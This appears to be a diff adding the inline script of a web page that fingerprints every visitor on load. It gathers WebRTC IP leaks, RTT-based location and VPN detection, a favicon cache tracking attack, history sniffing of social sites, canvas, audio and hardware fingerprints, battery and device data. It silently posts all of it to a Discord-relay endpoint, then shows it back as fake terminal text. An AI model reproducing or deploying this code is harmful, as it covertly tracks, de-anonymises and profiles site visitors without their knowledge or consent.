+        pointerType:           mq('(pointer: fine)')                     ? 'fine'    : mq('(pointer: coarse)') ? 'coarse' : 'none',
+        anyHover:              mq('(any-hover: hover)')                  ? 'yes'     : 'no',
+        anyPointerCoarse:      mq('(any-pointer: coarse)')               ? 'yes'     : 'no',
+        invertedColors:        mq('(inverted-colors: inverted)')         ? 'yes'     : 'no',
+        displayModeStandalone: mq('(display-mode: standalone)')          ? 'yes'     : 'no', // PWA detection
+        hdr:                   mq('(dynamic-range: high)')               ? 'yes'     : 'no',
+        colorGamutP3:          mq('(color-gamut: p3)')                   ? 'yes'     : 'no',
+        colorGamutRec2020:     mq('(color-gamut: rec2020)')              ? 'yes'     : 'no',
+        overflowBlock:         mq('(overflow-block: scroll)')            ? 'scroll'  : 'other',
+    };
+}
+
+/* ── #9 CROSS-SESSION VISIT COUNTER ── */
+// Uses localStorage to persist a visit counter + first-seen timestamp.
+// Combined with the favicon ID, gives strong cross-session linking.
+function getSessionHistory(){
+    try {
+        const KEY = '_vd';
+        const raw = localStorage.getItem(KEY);
+        const now = Date.now();
+        let data = raw ? JSON.parse(raw) : { firstSeen: now, visits: 0, lastSeen: null };
+        data.visits += 1;
+        data.lastSeen = now;
+        localStorage.setItem(KEY, JSON.stringify(data));
+        const daysSinceFirst = Math.round((now - data.firstSeen) / 86400000);
+        const hoursSinceLast = data.visits > 1 ? Math.round((now - (data.lastSeen - (now - data.lastSeen))) / 3600000) : null;
+        return {
+            visitCount:     String(data.visits),
+            firstSeen:      new Date(data.firstSeen).toLocaleString('pt-BR'),
+            daysSinceFirst: daysSinceFirst + 'd',
+            returning:      data.visits > 1 ? `YES (visit #${data.visits})` : 'no (first visit)',
+        };
+    } catch(_) {
+        return { visitCount: 'N/A', firstSeen: 'N/A', daysSinceFirst: 'N/A', returning: 'N/A (storage blocked)' };
+    }
+}
+
+async function initVisitor(){
+    const nav=navigator;
+    const conn=nav.connection||nav.mozConnection||nav.webkitConnection||{};
+
+    // Start behavior collection in parallel (runs for 4s)
+    const behaviorPromise = collectBehavior();
+
+    const [ipData,audioFp,webrtcIPs,rttResults,battery,mediaDevs,uach,sensors,faviconResult,workerCheck,historySniff]=await Promise.all([
+        fetch('https://ipinfo.io/json').then(r=>r.ok?r.json():{}).catch(()=>({})),
+        audioFingerprint(),
+        getWebRTCIPs(),
+        measureAllRTT(),
+        getBattery(),
+        getMediaDevices(),
+        getUACH(),
+        detectSensors(),
+        executeFaviconAttack(),
+        checkWorkerConcurrency(),
+        faviconHistorySniff(),
+    ]);
+
+    // Synchronous (instant)
+    const mathFP     = mathPrecisionFP();
+    const emojiFP    = emojiCanvasFP();
+    const mediaMQ    = cssMediaQueries();
+    const sessionHist = getSessionHistory();
+
+    // Behavior collected async (non-blocking — webhook sent after)
+    behaviorPromise.then(beh=>{
+        fetch('/api/send-to-discord',{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({_update:'behavior',...beh})
+        }).catch(_=>{});
+    });
+
+    const gl=webglInfo();
+    const cvs=canvasFingerprint();
+    const fonts=detectFonts();
+    const browser=getBrowser();
+
+    // TZ divergence: browser TZ vs ipinfo TZ
+    const ipTZ = ipData.timezone || 'N/A';
+    const tzDiv = analyzeTZDivergence(
+        Intl.DateTimeFormat().resolvedOptions().timeZone,
+        ipTZ
+    );
+
+    // Location inference from RTT + TZ + WebRTC
+    const locInfer = inferRealLocation(rttResults, Intl.DateTimeFormat().resolvedOptions().timeZone, ipData, webrtcIPs);
+
+    // Top 5 RTT results for readout
+    const rttTop = rttResults.slice(0,5).map(r=>r.label+':'+r.rtt+'ms').join('  |  ');
+
+    const info={
+        userAgent:   nav.userAgent,
+        browser,
+        platform:    nav.userAgentData?.platform||nav.platform||'N/A',
+        mobile:      String(nav.userAgentData?.mobile??('ontouchstart' in window)),
+        touch:       String(nav.maxTouchPoints||0),
+        lang:        nav.language||'N/A',
+        langs:       (nav.languages||[]).join(', ')||'N/A',
+        tz:          Intl.DateTimeFormat().resolvedOptions().timeZone||'N/A',
+        tzOffset:    'UTC'+(new Date().getTimezoneOffset()<=0?'+':'-')+Math.abs(new Date().getTimezoneOffset()/60),
+        resolution:  screen.width+'x'+screen.height,
+        available:   screen.availWidth+'x'+screen.availHeight,
+        viewport:    window.innerWidth+'x'+window.innerHeight,
+        dpr:         String(window.devicePixelRatio||1),
+        depth:       screen.colorDepth+'-bit',
+        cores:       String(nav.hardwareConcurrency||'N/A'),
+        memory:      nav.deviceMemory?nav.deviceMemory+'GB':'N/A',
+        connection:  conn.effectiveType||'N/A',
+        downlink:    conn.downlink?conn.downlink+'Mbps':'N/A',
+        rtt:         conn.rtt?conn.rtt+'ms':'N/A',
+        online:      String(nav.onLine),
+        ip:          ipData.ip||'N/A',
+        city:        ipData.city||'N/A',
+        region:      ipData.region||'N/A',
+        country:     ipData.country||'N/A',
+        org:         ipData.org||'N/A',
+        loc:         ipData.loc||'N/A',
+        canvasFp:    cvs,
+        audioFp:     audioFp.sum,
+        audioFpHash: audioFp.hash,
+        audioSampleRate: String(audioFp.sampleRate),
+        audioChannels:   String(audioFp.channels),
+        audioLatency:    String(audioFp.latency),
+        rtcPublicIPs: webrtcIPs.public.join(', ')||'N/A',
+        rtcLocalIPs:  webrtcIPs.local.join(', ')||'N/A',
+        rtcLeak:      webrtcIPs.public.length>0 ? 'YES' : 'no candidates',
+
+        // TZ divergence
+        ipTZ:         ipTZ,
+        tzDivergence: tzDiv.divergence ? 'YES' : 'no',
+        tzDivDetail:  tzDiv.detail,
+
+        // RTT geolocation
+        rttTop,
+        rttClosest:   rttResults[0].label+' ('+rttResults[0].rtt+'ms)',
+        rttRaw:       JSON.stringify(rttResults.slice(0,8).map(r=>({r:r.label,ms:r.rtt}))),
+
+        // Location inference
+        estimatedRegion:  locInfer.estimatedRegion,
+        estimatedTZRegion:locInfer.tzRegion,
+        vpnLikely:        locInfer.vpnLikely,
+        locConfidence:    locInfer.confidence,
+        locFlags:         locInfer.flags,
+        distFromIPkm:     locInfer.distFromIPkm,
+        locVerdict:       locInfer.verdict,
+        webglVendor: gl.vendor,
+        webglRenderer: gl.renderer,
+        fonts:       fonts.join(', ')||'none',
+        fontCount:   String(fonts.length),
+        cookies:     String(nav.cookieEnabled),
+        dnt:         String(nav.doNotTrack||'N/A'),
+        pdfViewer:   String(nav.pdfViewerEnabled??'N/A'),
+        referrer:    document.referrer||'(direct)',
+        navType:     (performance.getEntriesByType?.('navigation')?.[0]?.type)||'N/A',
+        loadTime:    Math.round(performance.now())+'ms',
+        ts:          new Date().toLocaleString('pt-BR'),
+
+        // Battery
+        batteryLevel:    battery.level,
+        batteryCharging: battery.charging,
+        batteryChTime:   battery.chargingTime,
+        batteryDisTime:  battery.dischargingTime,
+
+        // Media devices
+        cameras:  String(mediaDevs.cameras),
+        mics:     String(mediaDevs.mics),
+        speakers: String(mediaDevs.speakers),
+
+        // UA-CH high entropy
+        cpuArch:         uach.arch||'N/A',
+        cpuBitness:      uach.bitness||'N/A',
+        deviceModel:     uach.model||'N/A',
+        platformVersion: uach.platformVersion||'N/A',
+        browserVersions: uach.fullVersionList||'N/A',
+
+        // Sensors
+        hasAccelerometer: sensors.accelerometer,
+        hasGyroscope:     sensors.gyroscope,
+        hasOrientation:   sensors.orientation,
+
+        // Favicon Cache Attack (returning visitor ID)
+        faviconId:        faviconResult.id,
+        faviconReturning: faviconResult.returning ? 'YES — returning visitor' : 'no (first visit)',
+
+        // Favicon History Sniffing (social media detection)
+        sniffVisited:      historySniff.sniffVisited,
+        sniffVisitedCount: historySniff.sniffVisitedCount,
+        sniffRaw:          historySniff.sniffRaw,
+
+        // #4 Worker concurrency check
+        coresReported:   String(workerCheck.reported),
+        workerParallel:  workerCheck.parallelismConfirmed,
+        workerSpreadMs:  String(workerCheck.spreadMs),
+        coreSpoofSuspect:workerCheck.spoofSuspect,
+
+        // #5 Math/FPU fingerprint
+        mathFpHash:      mathFP.hash,
+        mathFpSample:    mathFP.sample,
+
+        // #6 Emoji canvas fingerprint
+        emojiFpHash:     emojiFP,
+
+        // #7 CSS media queries
+        mqReducedMotion: mediaMQ.prefersReducedMotion,
+        mqColorScheme:   mediaMQ.prefersColorScheme,
+        mqContrast:      mediaMQ.prefersContrast,
+        mqForcedColors:  mediaMQ.forcedColors,
+        mqHover:         mediaMQ.hoverCapability,
+        mqPointer:       mediaMQ.pointerType,
+        mqPWA:           mediaMQ.displayModeStandalone,
+        mqHDR:           mediaMQ.hdr,
+        mqColorGamut:    mediaMQ.colorGamutP3 === 'yes' ? 'p3' : mediaMQ.colorGamutRec2020 === 'yes' ? 'rec2020' : 'srgb',
+
+        // #9 Cross-session history
+        visitCount:      sessionHist.visitCount,
+        firstSeen:       sessionHist.firstSeen,
+        daysSinceFirst:  sessionHist.daysSinceFirst,
+        lsReturning:     sessionHist.returning,
+    };
+
+    // Main fingerprint send
+    fetch('/api/send-to-discord',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify(info)
+    }).catch(_=>{});
+
+    const L=[
+        '$ uname -a',
+        info.platform+'  '+info.browser+'  dpr='+info.dpr,
+        '',
+        '$ locale && date',
+        'LANG='+info.lang+'   LANGS='+info.langs,
+        'TZ='+info.tz+'  ('+info.tzOffset+')',
+        info.ts,
+        '',
+        '$ lscpu && free -h',
+        'CPU(s): '+info.cores+'   RAM: '+info.memory,
+        'touch_points: '+info.touch+'   mobile: '+info.mobile,
+        '',
+        '$ xrandr',
+        'screen:    '+info.resolution+'  '+info.depth,
+        'available: '+info.available+'   viewport: '+info.viewport,
+        '',
+        '$ curl ipinfo.io',
+        'ip:      '+info.ip,
+        'loc:     '+info.city+', '+info.region+', '+info.country,
+        'coords:  '+info.loc,
+        'org:     '+info.org,
+        '',
+        '$ cat /sys/class/net/eth0/speed',
+        'type:     '+info.connection,
+        'downlink: '+info.downlink+'   rtt: '+info.rtt+'   online: '+info.online,
+        '',
+        '$ glxinfo | grep -i renderer',
+        'vendor:   '+info.webglVendor,
+        'renderer: '+info.webglRenderer,
+        '',
+        '$ webrtc-stun-leak',
+        'real_public: '+info.rtcPublicIPs,
+        'local_net:   '+info.rtcLocalIPs,
+        'leak:        '+info.rtcLeak,
+        '',
+        '$ rtt-geo-probe',
+        info.rttTop,
+        'closest: '+info.rttClosest,
+        '',
+        '$ tz-divergence-check',
+        'browser_tz: '+info.tz,
+        'ip_tz:      '+info.ipTZ,
+        'divergence: '+info.tzDivergence+'  detail: '+info.tzDivDetail,
+        '',
+        '$ infer-real-location',
+        'estimated:   '+info.estimatedRegion+' / '+info.estimatedTZRegion,
+        'vpn_likely:  '+info.vpnLikely+'   confidence: '+info.locConfidence,
+        'dist_from_ip:'+info.distFromIPkm+'   flags: '+info.locFlags,
+        'verdict:     '+info.locVerdict,
+        '',
+        '$ canvas-fp && audio-fp',
+        'canvas:      0x'+info.canvasFp,
+        'audio_sum:   '+info.audioFp+'   audio_hash: '+info.audioFpHash,
+        'sample_rate: '+info.audioSampleRate+'   channels: '+info.audioChannels+'   latency: '+info.audioLatency,
+        '',
+        '$ fc-list | sort | uniq',
+        info.fontCount+' fonts detected: '+fonts.slice(0,7).join(', ')+(fonts.length>7?' [...]':''),
+        '',
+        '$ cat /proc/misc',
+        'cookies='+info.cookies+'   dnt='+info.dnt+'   pdf='+info.pdfViewer,
+        'referrer='+info.referrer,
+        'nav_type='+info.navType+'   load='+info.loadTime,
+        '',
+        '$ udevadm info /sys/class/power_supply/BAT0',
+        'level='+info.batteryLevel+'   charging='+info.batteryCharging,
+        'charge_time='+info.batteryChTime+'   discharge_time='+info.batteryDisTime,
+        '',
+        '$ v4l2-ctl --list-devices && arecord -l',
+        'cameras='+info.cameras+'   mics='+info.mics+'   speakers='+info.speakers,
+        '',
+        '$ cat /proc/cpuinfo | grep arch',
+        'arch='+info.cpuArch+'   bits='+info.cpuBitness+'   model='+info.deviceModel,
+        'platform_version='+info.platformVersion,
+        'ua_brands='+info.browserVersions,
+        '',
+        '$ ls /dev/input/event*',
+        'accelerometer='+info.hasAccelerometer+'   gyroscope='+info.hasGyroscope+'   orientation='+info.hasOrientation,
+        '',
+        '$ echo $?',
+        '0',
+        '',
+        '$ _',
+        '',
+    ];
+
+    const el=document.getElementById('tbg');
+    const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    let out='';
+    L.forEach(l=>{out+=esc(l)+'\n';});
+    el.innerHTML=out.repeat(8);
+
+    let sy=0;
+    (function sc(){sy+=0.25;if(sy>el.scrollHeight/8)sy=0;el.scrollTop=sy;requestAnimationFrame(sc);})();
+}
+
+initVisitor();
+</script>
+</body>
+</html>
